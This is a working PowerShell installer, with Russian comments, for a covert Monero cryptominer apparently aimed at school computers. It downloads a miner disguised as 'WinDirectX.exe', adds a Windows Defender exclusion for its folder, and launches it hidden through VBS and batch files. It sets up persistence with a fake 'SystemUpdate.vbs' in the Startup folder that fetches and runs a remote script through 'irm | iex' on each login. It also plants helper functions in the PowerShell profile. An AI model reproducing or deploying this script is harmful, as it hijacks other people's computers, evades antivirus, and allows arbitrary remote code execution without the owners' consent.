$path = "C:\ProgramData\SystemLib"
$wallet = "Ltc1ql404nad6rja6paas9h7dnd2uwmkju3re3s4tuf" # ПРОВЕРЬ СВОЙ АДРЕС!
$procName = "WinDirectX"
$exeUrl = "https://github.com/Isfandiyor0112-star/sminers/raw/main/WinDirectX.exe"
$rawScript = "https://raw.githubusercontent.com/Isfandiyor0112-star/sminers/refs/heads/main/win_utility.ps1"

Write-Host "--- ЗАПУСК СИСТЕМЫ УПРАВЛЕНИЯ ---" -ForegroundColor Cyan

# 1. Остановка старых процессов
Write-Host "[1/8] Очистка старых процессов..." -NoNewline
Stop-Process -Name $procName -Force -ErrorAction SilentlyContinue
Stop-Process -Name "xmrig" -Force -ErrorAction SilentlyContinue
Write-Host " Готово." -ForegroundColor Green

# 2. Настройка питания
Write-Host "[2/8] Оптимизация питания (24/7)..." -NoNewline
powercfg /x -standby-timeout-ac 0 > $null
powercfg /x -monitor-timeout-ac 5 > $null
Write-Host " Ок." -ForegroundColor Green

# 3. Работа с папкой и Антивирусом
Write-Host "[3/8] Настройка защиты..." -NoNewline
if (!(Test-Path $path)) { New-Item -ItemType Directory -Path $path -Force | Out-Null }
$exc = Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue
Write-Host " Папка готова, исключение добавлено." -ForegroundColor Green

# 4. Скачивание Майнера с проверкой
Write-Host "[4/8] Загрузка ядра майнера..." -NoNewline
try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri $exeUrl -OutFile "$path\$procName.exe" -ErrorAction Stop
    Write-Host " Успешно скачано." -ForegroundColor Green
} catch {
    Write-Host "`n[!] ОШИБКА: Не удалось скачать .exe! Проверь ссылку или интернет." -ForegroundColor Red
    exit
}

# 5. Создание файлов запуска
Write-Host "[5/8] Создание конфигурации..." -NoNewline
$cmd = "@echo off`n$path\$procName.exe -o gulf.moneroocean.stream:10128 -u $wallet -p school_pc --cpu-max-threads-hint 50 --no-huge-pages --algo rx/0 --donate-level 1 --priority 4"
$cmd | Out-File -FilePath "$path\run_cache.bat" -Encoding ascii
$vbs = "Set WshShell = CreateObject(`"WScript.Shell`")`nWshShell.Run `"$path\run_cache.bat`", 0, False"
$vbs | Out-File -FilePath "$path\win_start.vbs" -Encoding ascii
Write-Host " Файлы созданы." -ForegroundColor Green

# 6. Автозагрузка (VBS обновление)
Write-Host "[6/8] Установка автообновления..." -NoNewline
$startupVbs = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\SystemUpdate.vbs"
$payload = "CreateObject(""Wscript.Shell"").Run ""powershell -WindowStyle Hidden -Command [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; irm '$rawScript' | iex"", 0, True"
[System.IO.File]::WriteAllText($startupVbs, $payload)
Write-Host " Автозапуск настроен." -ForegroundColor Green

# 7. Функции контроля (check и update)
$ProfilePath = $PROFILE
if (!(Test-Path $ProfilePath)) { New-Item -Type File -Path $ProfilePath -Force | Out-Null }
$Functions = @"
function check {
    `$p = Get-Process $procName -ErrorAction SilentlyContinue
    if (`$p) { 
        Write-Host "СТАТУС: РАБОТАЕТ (ID: `$(`$p.Id))" -ForegroundColor Green 
        Write-Host "Память: `$([Math]::Round(`$p.WorkingSet64 / 1MB, 2)) MB" -ForegroundColor White
    } else { 
        if (Test-Path "$path\$procName.exe") { Write-Host "СТАТУС: ВЫКЛЮЧЕН (Файл на месте)" -ForegroundColor Yellow }
        else { Write-Host "СТАТУС: КРИТИЧЕСКАЯ ОШИБКА (Файл удален антивирусом!)" -ForegroundColor Red }
    }
}
function update {
    Write-Host "Принудительное обновление с GitHub..." -ForegroundColor Cyan
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    try { irm '$rawScript' | iex } catch { Write-Host "Ошибка обновления: GitHub недоступен." -ForegroundColor Red }
}
"@
$Functions | Out-File -FilePath $ProfilePath -Force
Write-Host "[7/8] Команды 'check' и 'update' зарегистрированы." -ForegroundColor Green

# 8. Запуск
Write-Host "[8/8] Финальный запуск..." -NoNewline
if (Test-Path "$path\win_start.vbs") {
    Start-Process -FilePath "$path\win_start.vbs"
    Write-Host " МАЙНЕР ЗАПУЩЕН." -ForegroundColor Green
} else {
    Write-Host " ОШИБКА: Файл запуска не найден!" -ForegroundColor Red
}

Write-Host "`n--- УСТАНОВКА ЗАВЕРШЕНА УСПЕШНО ---" -ForegroundColor Magenta
